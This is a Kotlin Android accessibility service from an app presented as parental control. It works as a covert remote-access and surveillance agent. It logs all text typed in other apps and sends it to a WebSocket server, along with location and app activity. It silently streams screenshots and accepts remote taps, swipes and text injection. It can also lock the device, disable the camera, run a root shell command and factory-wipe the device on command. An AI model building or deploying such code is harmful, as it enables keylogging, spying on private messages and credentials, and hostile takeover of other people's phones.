package com.controlparental.agent.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import com.controlparental.agent.receivers.AdminReceiver
import android.graphics.Bitmap
import android.graphics.Path
import android.media.AudioManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import com.controlparental.agent.net.AgentWebSocketClient
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClient.Listener {

    companion object {
        var instance: ParentalAccessibilityService? = null
            private set
    }

    private var wsClient: AgentWebSocketClient? = null
    private var locationTracker: LocationTracker? = null
    private var usageStatsMonitor: UsageStatsMonitor? = null
    private var lastPackage: String? = null
    private var lastTypedText: String? = null
    private var isLiveActive = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()
    private val blockedPackages = Collections.synchronizedSet(mutableSetOf<String>())

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i("ParentalAccService", "Servicio de Accesibilidad conectado.")

        // Iniciar cliente WebSocket
        wsClient = AgentWebSocketClient(listener = this).apply { start() }

        // Iniciar rastreo de ubicacion
        locationTracker = LocationTracker(this) { locJson ->
            wsClient?.send(locJson)
        }.apply { start() }

        // Iniciar monitoreo de uso de apps
        usageStatsMonitor = UsageStatsMonitor(this) { usageJson ->
            wsClient?.send(usageJson)
        }.apply { start() }

        // Consultar UsageStats cada 5 minutos
        mainHandler.postDelayed(object : Runnable {
            override fun run() {
                usageStatsMonitor?.queryAndReport()
                mainHandler.postDelayed(this, 300000L)
            }
        }, 300000L)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg.contains("com.controlparental.agent")) return

        val nowIso = isoFormat.format(Date())

        // ---------- BLOQUEO ACTIVO DE APLICACIONES ----------
        if (blockedPackages.contains(pkg)) {
            Log.w("ParentalAccService", "ACCESO DENEGADO: Aplicacion bloqueada intentando abrirse: $pkg")
            performGlobalAction(GLOBAL_ACTION_HOME)
            mainHandler.post {
                Toast.makeText(applicationContext, "🚫 Aplicación restringida por Control Parental", Toast.LENGTH_SHORT).show()
            }
            val blockEvent = JSONObject().apply {
                put("type", "app_blocked")
                put("app", pkg)
                put("ts", nowIso)
            }
            wsClient?.send(blockEvent)
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val className = event.className?.toString() ?: ""
                if (pkg != lastPackage) {
                    lastPackage = pkg
                    val activityJson = JSONObject().apply {
                        put("type", "activity")
                        put("app", pkg)
                        put("title", className)
                        put("detected", null)
                        put("ts", nowIso)
                    }
                    wsClient?.send(activityJson)
                    Log.i("ParentalAccService", "App activa detectada: $pkg")
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                val textList = event.text
                val text = if (!textList.isNullOrEmpty()) textList.joinToString(" ").trim() else ""
                if (text.isNotEmpty() && text != lastTypedText) {
                    lastTypedText = text
                    val typingJson = JSONObject().apply {
                        put("type", "typing")
                        put("app", pkg)
                        put("title", lastPackage ?: pkg)
                        put("text", text)
                        put("ts", nowIso)
                    }
                    wsClient?.send(typingJson)
                    Log.i("ParentalAccService", "Texto capturado en $pkg: $text")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w("ParentalAccService", "Servicio de Accesibilidad interrumpido.")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isLiveActive = false
        locationTracker?.stop()
        usageStatsMonitor?.stop()
        wsClient?.stop()
        Log.i("ParentalAccService", "Servicio de Accesibilidad destruido.")
    }

    // ---------- WebSocket Callbacks ----------
    override fun onConnected() {
        Log.i("ParentalAccService", "Conectado al servidor de control parental.")
        locationTracker?.queryLastKnown()
    }

    override fun onDisconnected() {
        Log.w("ParentalAccService", "Desconectado del servidor de control parental.")
    }

    override fun onBlockedAppsUpdated(apps: List<String>) {
        blockedPackages.clear()
        blockedPackages.addAll(apps)
        Log.i("ParentalAccService", "Lista de apps bloqueadas sincronizada: $blockedPackages")
    }

    override fun onGeofencesUpdated(zones: List<JSONObject>) {
        locationTracker?.updateGeofences(zones)
        Log.i("ParentalAccService", "Geocercas actualizadas: ${zones.size} zonas")
    }

    override fun onLiveRequest(requestId: String) {
        Log.i("ParentalAccService", "Solicitud de pantalla en vivo recibida (req=$requestId)")
        isLiveActive = true
        wsClient?.send(JSONObject().apply {
            put("type", "live.accepted")
            put("requestId", requestId)
        })
        startScreenCaptureLoop()
    }

    override fun onLiveStop() {
        Log.i("ParentalAccService", "Deteniendo pantalla en vivo.")
        isLiveActive = false
        wsClient?.send(JSONObject().apply { put("type", "live.stopped") })
    }

    fun sendCustomEvent(json: JSONObject) {
        wsClient?.send(json)
    }

    // ---------- Control Remoto Tactil (Gestures) ----------
    override fun onTap(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
            val stroke = GestureDescription.StrokeDescription(path, 0, 50)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, null, null)
            Log.i("ParentalAccService", "Toque remoto ejecutado en ($x, $y)")
        }
    }

    override fun onSwipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = Path().apply {
                moveTo(x1.toFloat(), y1.toFloat())
                lineTo(x2.toFloat(), y2.toFloat())
            }
            val dur = duration.coerceIn(100, 350).toLong()
            val stroke = GestureDescription.StrokeDescription(path, 0, dur)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, null, null)
            Log.i("ParentalAccService", "Deslizamiento remoto ejecutado: ($x1, $y1) -> ($x2, $y2) dur=${dur}ms")
        }
    }

    override fun onText(text: String) {
        val rootNode = rootInActiveWindow ?: return
        val focused = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val args = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            Log.i("ParentalAccService", "Texto inyectado en foco: $text")
        } else {
            val found = findAndSetText(rootNode, text)
            Log.i("ParentalAccService", "Texto inyectado recursivo ($found): $text")
        }
    }

    private fun findAndSetText(node: AccessibilityNodeInfo?, text: String): Boolean {
        if (node == null) return false
        if (node.isEditable) {
            val args = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndSetText(child, text)) return true
        }
        return false
    }

    override fun onKey(key: String) {
        Log.i("ParentalAccService", "Tecla recibida: $key")
        when (key) {
            "enter", "KEYCODE_ENTER" -> {
                val rootNode = rootInActiveWindow ?: return
                val focused = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                focused?.performAction(AccessibilityNodeInfo.ACTION_NEXT_AT_MOVEMENT_GRANULARITY)
            }
            "del", "backspace", "KEYCODE_DEL" -> {
                val rootNode = rootInActiveWindow ?: return
                val focused = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                if (focused != null && focused.text != null && focused.text.isNotEmpty()) {
                    val newText = focused.text.substring(0, focused.text.length - 1)
                    val args = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText)
                    }
                    focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                }
            }
            else -> {
                if (key.length == 1) {
                    onText(key)
                }
            }
        }
    }

    override fun onCommand(command: String, params: JSONObject) {
        Log.i("ParentalAccService", "Comando recibido: $command")
        when (command) {
            "request_location" -> locationTracker?.queryLastKnown()
            "request_screenshot" -> captureSingleFrame()
            "block_app" -> {
                val pkg = params.optString("app", "")
                if (pkg.isNotEmpty()) {
                    blockedPackages.add(pkg)
                    Log.i("ParentalAccService", "App bloqueada localmente: $pkg")
                }
            }
            "unblock_app" -> {
                val pkg = params.optString("app", "")
                if (pkg.isNotEmpty()) {
                    blockedPackages.remove(pkg)
                    Log.i("ParentalAccService", "App desbloqueada: $pkg")
                }
            }
            "lock" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                try {
                    dpm?.lockNow()
                } catch (e: Exception) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                    }
                }
            }
            "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "wake" -> {
                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                @Suppress("DEPRECATION")
                val wl = pm?.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "ParentalApp:Wake")
                wl?.acquire(3000)
            }
            "volume_up", "volume_down" -> {
                val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
                val dir = if (command == "volume_up") AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER
                am?.adjustStreamVolume(AudioManager.STREAM_MUSIC, dir, AudioManager.FLAG_SHOW_UI)
            }
            "keep_awake" -> {
                // Mantener pantalla encendida siempre
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "settings put system screen_off_timeout 2147483647"))
                } catch (e: Exception) {
                    Log.w("ParentalAccService", "keep_awake sin root: intentando via settings")
                }
                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                @Suppress("DEPRECATION")
                val wl = pm?.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "ParentalApp:KeepAwake")
                wl?.acquire(600000) // 10 minutos
                Log.i("ParentalAccService", "keep_awake: pantalla configurada para no apagarse")
            }
            "wipe" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                try {
                    dpm?.wipeData(0)
                    Log.i("ParentalAccService", "wipe: borrado de fabrica iniciado")
                } catch (e: Exception) {
                    Log.e("ParentalAccService", "wipe error: ${e.message}")
                }
            }
            "disable_camera" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                try {
                    dpm?.setCameraDisabled(admin, true)
                    Log.i("ParentalAccService", "disable_camera: camara deshabilitada")
                } catch (e: Exception) {
                    Log.e("ParentalAccService", "disable_camera error: ${e.message}")
                }
            }
            "enable_camera" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                try {
                    dpm?.setCameraDisabled(admin, false)
                    Log.i("ParentalAccService", "enable_camera: camara habilitada")
                } catch (e: Exception) {
                    Log.e("ParentalAccService", "enable_camera error: ${e.message}")
                }
            }
        }
    }

    // ---------- Captura Silenciosa de Pantalla ----------
    private fun startScreenCaptureLoop() {
        if (!isLiveActive) return
        captureSingleFrame {
            mainHandler.postDelayed({
                if (isLiveActive) startScreenCaptureLoop()
            }, 800L)
        }
    }

    @SuppressLint("NewApi")
    private fun captureSingleFrame(onComplete: (() -> Unit)? = null) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    mainExecutor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(screenshot: ScreenshotResult) {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val colorSpace = screenshot.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()

                            if (bitmap != null) {
                                executor.execute {
                                    val b64 = compressBitmapToBase64(bitmap)
                                    val frameJson = JSONObject().apply {
                                        put("type", "live.frame")
                                        put("image", b64)
                                    }
                                    wsClient?.send(frameJson)
                                    mainHandler.post { onComplete?.invoke() }
                                }
                            } else {
                                onComplete?.invoke()
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w("ParentalAccService", "Error capturando pantalla: $errorCode")
                            onComplete?.invoke()
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e("ParentalAccService", "Excepcion en takeScreenshot: ${e.message}")
                onComplete?.invoke()
            }
        } else {
            onComplete?.invoke()
        }
    }

    private fun compressBitmapToBase64(src: Bitmap): String {
        val maxW = 960
        val ratio = if (src.width > maxW) maxW.toFloat() / src.width else 1.0f
        val targetW = (src.width * ratio).toInt()
        val targetH = (src.height * ratio).toInt()

        val softwareBitmap = src.copy(Bitmap.Config.ARGB_8888, false)
        val scaled = if (ratio < 1.0f) Bitmap.createScaledBitmap(softwareBitmap, targetW, targetH, true) else softwareBitmap

        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, 55, out)
        return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    }
}
